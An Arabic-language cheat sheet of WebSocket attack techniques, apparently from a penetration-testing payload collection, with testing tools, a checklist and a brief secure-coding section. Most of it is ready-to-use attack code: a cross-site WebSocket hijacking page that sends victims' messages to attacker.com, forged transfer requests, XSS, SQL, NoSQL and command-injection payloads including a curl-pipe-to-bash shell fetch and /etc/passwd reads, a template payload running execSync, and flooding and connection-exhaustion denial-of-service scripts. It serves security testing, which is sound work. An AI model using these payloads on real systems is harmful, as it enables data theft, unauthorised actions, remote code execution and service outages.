<a id="-websocket-attacks-cheatsheet"></a>
# 🔌 مرجع سريع لهجمات WebSocket

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

---

<a id="-websocket-basics"></a>
## 🔍 أساسيات WebSocket

<a id="handshake-request"></a>
### طلب المصافحة
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

<a id="handshake-response"></a>
### استجابة المصافحة
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

<a id="detection"></a>
### الكشف
```
- ws:// (دون تشفير)
- wss:// (مشفّر باستخدام TLS)
- الترويسة Upgrade: websocket
- تعرض علامة تبويب Network القيمة "101 Switching Protocols"
```

---

<a id="-websocket-vulnerabilities"></a>
## 🎯 ثغرات WebSocket

<a id="1-cross-site-websocket-hijacking-cswsh"></a>
### 1. اختطاف WebSocket عبر المواقع (CSWSH)

**الحالة المعرضة للثغرة:** الخادم لا يتحقق من ترويسة Origin

```html
<!-- صفحة المهاجم -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // فُتح الاتصال؛ يستطيع المهاجم إرسال الرسائل
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // سرقة البيانات وإرسالها إلى المهاجم
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**هجوم على غرار تزوير الطلبات عبر المواقع (CSRF):**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // تنفيذ إجراءات بهوية الضحية
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

<a id="2-missing-origin-validation"></a>
### 2. غياب التحقق من Origin

**الاختبار:**
```bash
# استخدام wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# استخدام websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**الاستغلال:**
```javascript
// إذا كان الخادم يقبل أي مصدر Origin
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

<a id="3-authentication-bypass"></a>
### 3. تجاوز المصادقة

**غياب المصادقة عند اتصال WebSocket:**
```javascript
// الاتصال دون ملفات تعريف الارتباط أو رموز وصول
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // هل لا تُشترط المصادقة؟
};
```

**رمز الوصول في URL (خطر التسرب):**
```
wss://target.com/ws?token=SECRET_TOKEN
// قد يتسرب الرمز في السجلات أو ترويسات الإحالة
```

**اختبار حالات المصادقة المختلفة:**
```javascript
// الاختبار برمز منتهي الصلاحية
// الاختبار برمز معدّل
// الاختبار دون رمز
// الاختبار برمز مستخدم آخر
```

---

<a id="4-injection-attacks-via-websocket"></a>
### 4. هجمات الحقن عبر WebSocket

**حقن XSS عبر WebSocket:**
```javascript
// إرسال حمولة XSS
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**حقن SQL:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**حقن الأوامر:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**حقن NoSQL:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

<a id="5-dos-attacks"></a>
### 5. هجمات حجب الخدمة (DoS)

**إغراق الرسائل:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // رسائل كبيرة
  }, 1);
};
```

**استنزاف الاتصالات:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # إبقاء الاتصال مفتوحًا

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

<a id="6-data-manipulation"></a>
### 6. التلاعب بالبيانات

**تعديل الرسائل:**
```javascript
// اعتراض الرسائل وتعديلها
// استخدام اعتراض WebSocket في Burp Suite

// الأصلي
{"action": "transfer", "amount": 10, "to": "user123"}

// المعدّل
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**حالات التسابق:**
```javascript
// إرسال طلبات متعددة بسرعة
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

<a id="-testing-tools"></a>
## 🛠️ أدوات الاختبار

<a id="burp-suite"></a>
### Burp Suite
```
1. Proxy → WebSockets history
2. انقر بزر الفأرة الأيمن ← Send to Repeater
3. تعديل الرسائل وإعادة إرسالها
4. تفعيل "Auto-scroll to end"
```

<a id="wscat-cli"></a>
### wscat (CLI)
```bash
# التثبيت
npm install -g wscat

# الاتصال
wscat -c wss://target.com/ws

# مع ترويسات
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# مع ترويسة Origin
wscat -c wss://target.com/ws -o "https://target.com"
```

<a id="websocat"></a>
### websocat
```bash
# التثبيت
cargo install websocat

# الاتصال
websocat wss://target.com/ws

# مع ترويسات
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

<a id="python-testing-script"></a>
### سكربت اختبار باستخدام Python
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # حمولات الاختبار
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

<a id="browser-devtools"></a>
### أدوات المطور في المتصفح
```javascript
// مراقبة حركة WebSocket
// F12 → Network → WS filter

// اختبار يدوي
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

<a id="-payload-collection"></a>
## 💉 مجموعة الحمولات

<a id="authentication-testing"></a>
### اختبار المصادقة
```json
// دون مصادقة
{"action": "get_secret_data"}

// رمز فارغ
{"token": "", "action": "admin_action"}

// رمز بقيمة null
{"token": null, "action": "delete_user"}
```

<a id="xss-payloads"></a>
### حمولات XSS
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

<a id="sqli-payloads"></a>
### حمولات SQLi
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

<a id="command-injection"></a>
### حقن الأوامر
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

<a id="path-traversal"></a>
### اجتياز المسارات (Path Traversal)
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

<a id="-testing-checklist"></a>
## 📋 قائمة التحقق للاختبار

```markdown
## قائمة التحقق لأمن WebSocket

□ تحديد نقاط نهاية WebSocket
□ التحقق من فحص ترويسة Origin
□ اختبار اختطاف WebSocket عبر المواقع (CSWSH)
□ اختبار متطلبات المصادقة
□ التحقق من تمرير الرموز بأمان
□ اختبار ثغرات الحقن (XSS, SQLi وغيرها)
□ اختبار التفويض (الوصول إلى بيانات مستخدمين آخرين)
□ التحقق من تحديد معدل الطلبات
□ اختبار حدود حجم الرسائل
□ البحث عن كشف البيانات الحساسة
□ اختبار إدارة الاتصالات (إعادة الاتصال)
□ التحقق من التشفير (wss:// مقابل ws://)
```

---

<a id="-secure-implementation"></a>
## 🔐 التنفيذ الآمن

```javascript
// التحقق من Origin على الخادم
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// المصادقة باستخدام الرموز
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// التحقق من المدخلات
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

<a id="-related-payloads"></a>
## 🔗 حمولات ذات صلة

- [حمولات XSS](./XSS.ar.md)
- [حمولات SQLi](./SQLi.ar.md)
- [حقن الأوامر](./Command-Injection.ar.md)

---

**العودة إلى الحمولات:** [💉 مجموعة الحمولات](../../README.md#-payloads-collection)
